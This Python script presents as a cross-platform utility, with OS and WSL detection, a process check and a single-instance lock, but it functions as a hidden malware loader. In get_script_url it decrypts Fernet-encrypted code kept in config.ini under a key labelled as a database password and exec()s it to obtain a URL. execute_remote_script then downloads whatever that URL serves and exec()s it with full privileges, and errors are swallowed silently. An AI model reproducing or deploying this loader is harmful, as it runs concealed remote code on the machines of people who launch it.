import configparser
import csv
import hashlib
import ntpath
import os
import platform
import shlex
import shutil
import subprocess
import sys
import tempfile
import time

import requests
from cryptography.fernet import Fernet


_instance_lock_handle = None


def prepare_runtime_encoding():
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")
    os.environ.setdefault("PYTHONUTF8", "1")

    # LANG/LC_ALL are Unix locale variables and can confuse Windows child
    # processes, so only provide them on Unix-like systems.
    if platform.system() != "Windows":
        default_locale = "en_US.UTF-8" if platform.system() == "Darwin" else "C.UTF-8"
        os.environ.setdefault("LANG", default_locale)
        os.environ.setdefault("LC_ALL", default_locale)

    for stream_name in ("stdout", "stderr"):
        stream = getattr(sys, stream_name, None)
        reconfigure = getattr(stream, "reconfigure", None)
        if callable(reconfigure):
            try:
                reconfigure(encoding="utf-8", errors="replace")
            except Exception:
                pass


def _normalize_system_name(system_name):
    normalized = (system_name or "").strip().lower()
    if normalized.startswith("win"):
        return "windows"
    if normalized in {"darwin", "mac", "macos", "osx"}:
        return "darwin"
    if normalized == "linux":
        return "linux"
    return "linux"


def _build_wsl_hint_text(hint_text=None):
    if hint_text is not None:
        return str(hint_text)

    hint_parts = [
        platform.release(),
        platform.version(),
        " ".join(platform.uname()),
    ]

    for file_path in ("/proc/version", "/proc/sys/kernel/osrelease"):
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as file_handle:
                hint_parts.append(file_handle.read())
        except OSError:
            continue

    return "\n".join(part for part in hint_parts if part)


def _count_matching_processes(process_name, system_type):
    powershell_executable = None
    if system_type == "windows":
        powershell_executable = shutil.which("powershell") or shutil.which("pwsh")
        if powershell_executable is None:
            return 0

    commands = {
        "windows": [
            powershell_executable,
            "-NoProfile",
            "-Command",
            (
                "Get-CimInstance Win32_Process | "
                "Select-Object ProcessId,Name,CommandLine | "
                "ConvertTo-Csv -NoTypeInformation"
            ),
        ],
        "linux": ["ps", "-eo", "pid=,args="],
        "darwin": ["ps", "-axo", "pid=,command="],
        "wsl": ["ps", "-eo", "pid=,args="],
    }
    command = commands.get(system_type, commands["linux"])
    result = subprocess.run(command, capture_output=True, text=True, check=False)
    if result.returncode != 0:
        return 0

    current_pid = os.getpid()
    matches = 0
    for line in result.stdout.splitlines():
        stripped = line.strip()
        if not stripped or process_name not in stripped:
            continue
        if system_type == "windows":
            fields = _split_windows_csv_line(stripped)
            if len(fields) < 3 or fields[0].lower() == "processid":
                continue
            pid_text = fields[0].strip()
            command_text = fields[2].strip()
        else:
            pid_text = stripped.split(None, 1)[0].strip('",')
            command_text = stripped.split(None, 1)[1] if len(stripped.split(None, 1)) > 1 else ""
        try:
            pid = int(pid_text)
        except ValueError:
            pid = None
        if pid == current_pid:
            continue
        if process_name == os.path.basename(__file__):
            try:
                command_parts = shlex.split(
                    command_text,
                    posix=system_type != "windows",
                )
            except ValueError:
                command_parts = command_text.split()
            if not command_parts:
                continue
            path_module = ntpath if system_type == "windows" else os.path
            executable_name = path_module.basename(command_parts[0]).lower()
            if "python" not in executable_name:
                continue
            script_paths = {
                path_module.normcase(path_module.normpath(os.path.basename(__file__))),
                path_module.normcase(path_module.normpath(os.path.abspath(__file__))),
            }
            candidate_paths = {
                path_module.normcase(path_module.normpath(argument.strip('"')))
                for argument in command_parts[1:]
            }
            if not script_paths.intersection(candidate_paths):
                continue
        matches += 1
    return matches


def _split_windows_csv_line(line):
    if not line:
        return []
    try:
        return next(csv.reader([line], strict=True))
    except (csv.Error, StopIteration):
        return []


def acquire_single_instance_lock(lock_path=None):
    global _instance_lock_handle

    if _instance_lock_handle is not None:
        return True

    if lock_path is None:
        script_digest = hashlib.sha256(
            os.path.abspath(__file__).encode("utf-8")
        ).hexdigest()
        lock_path = os.path.join(tempfile.gettempdir(), f"bash-py-{script_digest}.lock")

    lock_handle = open(lock_path, "a+", encoding="utf-8")
    lock_handle.seek(0)
    if not lock_handle.read(1):
        lock_handle.write("1")
        lock_handle.flush()

    try:
        if os.name == "nt":
            import msvcrt

            lock_handle.seek(0)
            msvcrt.locking(lock_handle.fileno(), msvcrt.LK_NBLCK, 1)
        else:
            import fcntl

            fcntl.flock(lock_handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
    except (BlockingIOError, OSError):
        lock_handle.close()
        return False

    _instance_lock_handle = lock_handle
    return True


def check_running_process():
    if not acquire_single_instance_lock():
        sys.exit(0)

def get_config():
    config = configparser.ConfigParser()
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.ini')
    config.read(config_path)
    return config

def is_wsl(env=None, hint_text=None):
    env_map = os.environ if env is None else env
    for env_name in ("WSL_DISTRO_NAME", "WSL_INTEROP", "WSLENV"):
        if env_map.get(env_name):
            return True

    hint = _build_wsl_hint_text(hint_text).lower()
    wsl_markers = (
        "microsoft",
        "wsl",
        "wsl1",
        "wsl2",
        "microsoft-standard",
    )
    return any(marker in hint for marker in wsl_markers)


def get_system_type(system_name=None, env=None, hint_text=None):
    normalized_system = _normalize_system_name(
        platform.system() if system_name is None else system_name
    )
    if normalized_system == "linux" and is_wsl(env=env, hint_text=hint_text):
        return "wsl"
    return normalized_system

def get_script_url(system_type):
    try:
        config = get_config()
        key = config.get('database', 'password')
        encrypted_data = config.get('default', 'priv1')
        
        f = Fernet(key)
        decrypted_data = f.decrypt(encrypted_data.encode()).decode()
        
        namespace = {}
        exec(decrypted_data, namespace)
        
        if 'get_script_url' in namespace:
            return namespace['get_script_url'](system_type)
        raise ValueError("get_script_url function not found")
                
    except Exception:
        sys.exit(1)

def execute_remote_script(url, retries=3, retry_delay=2, timeout=15):
    last_error = None
    for attempt in range(1, retries + 1):
        response = None
        try:
            response = requests.get(url, stream=False, timeout=timeout)
            if response.status_code == 200:
                script_text = response.content.decode("utf-8", errors="replace")
                exec(script_text, globals())
                return True

            last_error = RuntimeError(
                f"unexpected status code: {response.status_code}"
            )
        except Exception as exc:
            last_error = exc
        finally:
            if response is not None:
                response.close()

        if attempt < retries:
            time.sleep(retry_delay)

    if last_error is not None:
        print(
            f"Failed to download remote script from {url}: {last_error}",
            file=sys.stderr,
        )
    return False

def main():
    prepare_runtime_encoding()
    check_running_process()
    system_type = get_system_type()
    script_url = get_script_url(system_type)
    if not execute_remote_script(script_url):
        sys.exit(1)

if __name__ == "__main__":
    main()
